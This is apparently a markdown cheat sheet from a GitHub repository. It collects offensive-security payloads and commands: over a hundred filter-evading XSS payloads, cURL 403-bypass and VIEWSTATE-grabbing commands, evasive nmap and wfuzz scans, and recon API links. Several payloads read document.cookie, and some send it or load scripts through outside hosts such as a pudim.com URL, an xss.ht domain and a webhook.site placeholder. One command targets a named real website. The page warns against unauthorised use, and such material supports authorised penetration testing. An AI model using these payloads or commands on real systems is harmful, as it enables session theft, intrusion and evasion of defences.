<br>
<h1 align="center"> Offensive Security MISC Anotations and Payloads</h1> <br>

<br>

# Topics: <br>

- [XSS Payloads](#--xss)

- [cURL Related](#curl-related)

<br>
<hr>

# - [XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- XSS payloads <br>

<br>

## ⚠️ Danger zone! ⚠️ <br>
> Danger zone is the area which the payloads can be **OR** will be harmfull to a web application. <br>
> So, do not use them unless you're sure the web app. will not be damaged or you're testing on a **ALLOWED enviroment!** <br>
> I do **NOT** take any responsability to any of you who wants to test on random websites. You have been warned!

<br>

> Do not use these payloads in a random or unauthorized web site, I do not take any resposibility <br>
> to any person who decide to execute those on random places, you have been warned!

## XSS Payloads <br>

```txt
<script>alert(document.domain+"\n\n"+document.cookie);<script>
</script><svg><script/class=rodric>alert(1)</script>-%26apos;
</SCRIPT>"><svg/OnLoad="`${prompt``}`">exemplo
""><svg/onload=alert(1)>%27/---+{{77}}"
;//<!----><SCRIPT>alert(1);</SCRIPT><svg onload="alert(document.domain)">
;//<!----><SCRIPT>alert(1);</SCRIPT><svg onerror="alert(document.write(1337))">
<svg onload='alert(1)'
<svg onload="alert(1)"
<svg onload=alert(1)//
<svg onload=alert(1)+
<svg onload=alert(1)<!--
<svg/onload=window.alert();//
<!--><svg/onload=window.alert();//
"><img src =" x "oerror = " alert ('RodricBr); ">
"><script><svg/alert%20(document.cookie)</script>
%22on%3eerror=%22prompt(document.domain)
%27%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
%3Cscript%3Ealert(document.domain);%3C/script%3E
--><font color=blue><h1>xss<img src onerror=alert(`XSS`)>/
"onmouseover=alert(1)//
%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E
'onerror=%22alert%60kauenavarro%60%22testabcd))/
%3cscript%3eprompt(document.domain)%3c%2fscript%3e
javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
1%27%22%28%29%26%25%3Cacx%3E%3CScRiPt%20%3Ealert%28document.domain%29%3C/ScRiPt%3E
'"()%26%25<acx><ScRiPt%20>alert(document.domain)</ScRiPt>
'();}]9676"></script><script>alert(document.domain)</script>
"%20"><input><img src=x onerror=alert(document.domain)>%3
%22%3E%3C%2Fa%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28document.cookie%29%3B%3E%3C%2Fscript%3E
%3Cmarquee%20loop%3d1%20width%3d0%20onfinish%3dco\u006efirm(document.cookie)%3EXSS%3C%2fmarquee%3E
"><svg+svg+svg\/\/On+OnLoAd=confirm(document.cookie)>
javascript:alert(document.domain)
%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3B%3E
%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28POCkauenavarroxss%29%3E
;'"/'/><svg/onload=confirm('teste
'%22()%26%25<acx><ScRiPt%20>alert(1)</ScRiPt>
<ScRiPt>prompt%289371%29<%2FScRiPt>=<ScRiPt>alert%28document.domain%29<%2FsCrIpT>
0%0d%0a%0d%0a23%0d%0a<svg%20onload=confirm(document.domain)>%0d%0a0%0d%0a
%27x%27onclick=%27alert(1)
onMouseOvER=prompt(/xss/)//
%27%20onclick=alert(document.domain)%20accesskey=X%20
%3Cmarquee%20loop=1%20width=%271%26apos;%27onfinish=self[`al`+`ert`](1)%3E%23leet%3C/marquee%3E
asd"on+<>+onpointerenter%3d"x%3dconfirm,x(cookie)
<s%00c%00r%00%00ip%00t>confirm(0);</s%00c%00r%00%00ip%00t>
<// style=x:expression\28write(1)\29>
<!--[if]><script>alert(1)</script -->
<a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B'>@cr:0xInfection
<script>eval(atob(decodeURIComponent("payload")))//
<a href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:open()>clickhere
<svg onx=() onload=(confirm)(1)>
<a+HREF='javascrip%26%239t:alert%26lpar;document.domain)'>teste</a>
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
1'"><img/src/onerror=.1|alert``>
<--`<img/src=` onerror=confirm``> --!>
javascript:{alert`0`}
<base href=//knoxss.me?
<a69/onclick=[1].findIndex(alert)>sussy
<input/oninput='new Function`confir\u006d\`0\``'>
<p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True>dragme
<svg/onload=prompt(1);>
<isindex action="javas&tab;cript:alert(1)" type=image>
<marquee/onstart=confirm(2)>
3&clave=%3Cimg%20src=%22WTF%22%20onError=%22{
0%22%3E%3Ciframe%20src=http://vuln-lab.com%20onload=alert%28%22VL%22%29%20%3C
<table background="javascript:alert(1)"></table>
"/><marquee onfinish=confirm(123)>a</marquee>
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme
<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
<a69/onclick=write&lpar;&rpar;>hi
<svg/onload=self[`aler`%2b`t`]`1`>
anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
"/><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
<img src=x onerror=alert('XSS')>.png
"><img src=x onerror=alert('XSS')>.png
"><svg onmouseover=alert(1)>.svg
<<script>alert('xss')<!--a-->a.png
java%0dscrip%0d%1b%1bt:console.log`${document.cookie}`}
java%0dscrip%0d%1b%1bt:console.log`${location=`https://www.pudim. com?c=${document.cookie}`}
"><x onauxclick=a=alert,a(domain)>click
<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
<sc%00ript>confirm(1)</script>
\"><iframe/src=javascript:alert%26%23x000000028%3b)>
\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7
jaVasCript:/*-/*`/*\`/*'/*"/**/(/*+*/oNcliCk=alert()+)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
<Video><source onerror = "javascript: alert (XSS)">
<Input value = "XSS" type = text>
<applet code="javascript:confirm(document.domain);">
<isindex x="javascript:" onmouseover="alert(document.domain)">
"></SCRIPT>''>'><SCRIPT>alert(String.fromCharCode(88.83.83))</SCRIPT>
"><img src="x:x" onerror="alert(document.domain)">
"><iframe src="javascript:alert(document.domain)">
<object data="javascript:alert(document.domain)">
<isindex type=image src=1 onerror=alert(document.domain)>
<img src=x:alert(alt) onerror=eval(src) alt=0>
<img src="x:gif" onerror="window['al\u0065rt'](0)"></img>
<iframe/src="data:text/html,<svg onload=alert(document.domain)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(document.domain)" http-equiv="refresh"/>
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<meta http-equiv="refresh" content="0;url=javascript:confirm(document.domain)">
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<form><a href="javascript:\u0061lert(document.domain)">X
</script><img/*%00/src="worksinchrome&colon;prompt(document.domain)"/%00*/onerror='eval(src)'>
<style>//*{x:expression(alert(/document.domain/))}//<style></style>
<img src="/" =_=" title="onerror='prompt(document.domain)'">
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa href=j&#97v&#97script:&#97lert(document.domain)>CLICK
<form><button formaction=javascript&colon;alert(document.domain)>CLICK
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:confirm(document.domain)"></OBJECT>
javascripT:eval('var a=document.createElement(\'script\'):a.src=\'https://ofjaaaah.xss.ht\':document.body.appendChild(a)')
%3Cmarquee%20loop=1%20width=%271%26apos;%27onfinish=self[`al`+`ert`](1)%3E%23leet%3C/marquee%3E
%3Cx%20y=1%20z=%271%26apos;%27onclick=self[`al`%2B`ert`](1)%3E%23CLICK%20MEE
0%3Bdata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5wcm9tcHQoIlJlZmxlY3RlZCBYU1MgUE9DbCIpPC9zY3JpcHQ%22HTTP-EQUIV%3D%22refresh%22
xss><svg/onload=globalThis[`al`+/ert/.source]`1`//
```

## XSS + SSRF <br>

```html
;//<!----><SCRIPT>alert(1);</SCRIPT><iframe src="https://webhook.site/YOUR_HOOK"></iframe>
```

<br>

<hr>

<br>

# cURL Related

## - cURL .NET Serialized object grabber
- [cURL](https://linux.die.net/man/1/curl) is a tool to transfer data from or to a server.
- .NET Deserialization ([CVE-2019-18935](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18935))

### Grep for __VIEWSTATE parameters in a determined url <br>

```bash
curl -v -s -k https://www.nepalipaisa.com/News.aspx | grep VIEW >> arquivo.txt
```

### Grabbing only the objects on the output file & throwing the objects into stdout <br>

```bash
cat arquivo.txt | awk -v value="[teste]>>> " '{print value$5}' | tr -d value=\" | awk '{print $2}' | sed 'G'
```

<br>

<hr>

<br>

## - Bypass 403 Redirect
- Mind maps for 403 Bypass: **https://github.com/KathanP19/HowToHunt/tree/master/Status_Code_Bypass**
- [Bypassing 403 medium post](https://medium.com/@dufferhackers/403-forbidden-bypass-technique-eda321012baa)

<br>

### cURL 403 Bypasses: <br>
```bash
curl -s -k -X GET https://www.site.com/ -v -H "X-Originating-IP: 127.0.0.1, 68.180.194.242" -H "User-Agent: GoogleBot" -H "Content-Length:0"
curl -i -s -k -X GET https://www.site.com/ -H "Host: www.site.co" -H "X-rewrite-url: directory"
```

<br>

<hr>

<br>

# - Tools

# Nmap Ultimate Scan v1 ([man](https://man7.org/linux/man-pages/man1/nmap.1.html))
- Nmap is a network discovery and security auditing.
- It can also be used for web application.
- Replace the API-KEY with your [Shodan](https://www.shodan.io) API Key

```sh
sudo nmap --randomize-hosts -Pn 0.0.0.0 --script shodan-api --script-args shodan-api.apikey=API-KEY -v -sS --open --reason --ttl=128 -sV --top-ports=20 --min-rate=2000 -T3  --spoof-mac=google -g443 --script="not intrusive" -oN resultados.txt
```

### Explanation:
```markdown
--randomize-hosts        :: Tells Nmap to shuffle each group of up to 16384 hosts before it scans them.
-Pn                      :: Skips the host discovery stage altogether.
--script *               :: Invoking the script to Shodan API.
-v                       :: Verbose mode.
-sS                      :: TCP SYN scan.
--open                   :: Show open ports.
--reason                 :: Shows the reason each port is set to a specific state and the reason each host is up or down.
--ttl=128                :: Tricks the Target/Firewalls of thinking the user is scanning using Windows OS.
-sV                      :: -sS added with -sV means that in case a port doesn't respond with SYN/ACK, Nmap will close the conection with RST.
--top-ports=20           :: Scan 20 most common ports (Can be set to any number).
--min-rate=2000          :: Send packets no slower than 2000 per second.
-T3                      :: Timing template set to polite.
--spoof-mac=google       :: Spoof MAC address.
-g443                    :: Spoof source port number.
--script="not intrusive" :: Loads every script except for those in the intrusive category.
-oN                      :: Output the results to a file named resultados.txt
```

<br>

# - wFuzz ([man](https://www.kali.org/tools/wfuzz/))
- wFuzz is a web application fuzzing tool <br>

<br>

###  Ultimate wFuzz command v1 <br>
- You can find awesome wordlists [here](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content)

```sh
sudo wfuzz --hc 404,400,302,301 -u https://site.com/FUZZ -w WORDLIST.txt -H "User-Agent: Googlebot-News" -t 50
```

### Explanation:
```markdown
--hc                     :: Ignore 404, 400, 302 and 301 status codes.
-u                       :: Url with the FUZZ param where the program shall do the fuzzing.
-w                       :: Using a wordlist.
-H                       :: Trying to trick the WAF with a Google-bot user agent.
-t                       :: Using 50 threads.
```

<br>

<hr>

<br>

# - APIs
- Apis for any kinds of target reconnaissance.
- Can be also used with cURL for automatic tool making
- Switch the URL with your target's domain or ip.

<br>

## DNS Look up <br>

> https://api.hackertarget.com/dnslookup/?q=URL <br>
> https://api.threatminer.org/v2/domain.php?q=URL&rt=5

<br>

## HTTP Headers <br>

> https://api.hackertarget.com/httpheaders/?q=URL

<br>

## Host Search & Sub-domains <br>

> https://api.hackertarget.com/hostsearch/?q=URL
> https://sonar.omnisint.io/subdomains/URL
> https://jldc.me/anubis/subdomains/URL

<br>

## Crawlers <br>
- Alien Vault limit parameter can be set to any integer number,
- as well as the page parameter.
- Common Crawl outputs with json format.

> https://otx.alienvault.com/api/v1/indicators/hostname/URL/url_list?limit=50&page=1 <br>
> https://index.commoncrawl.org/CC-MAIN-2021-43-index?url=URL&output=json

<br>
<br>
<br>
<br>
<hr>


#### Credits: <br>

> [Me](https://github.com/rodricbr)               :: Creator of this directory and most of the payloads/commands

> [NobodyKnows](https://github.com/almostfamous2) :: Base creator of the [Nmap command](#nmap-ultimate-scan-v1-man)

> [Me](https://github.com/rodricbr)               :: Creator of the [cURL .NET command](#--curl-net-serialized-object-grabber)


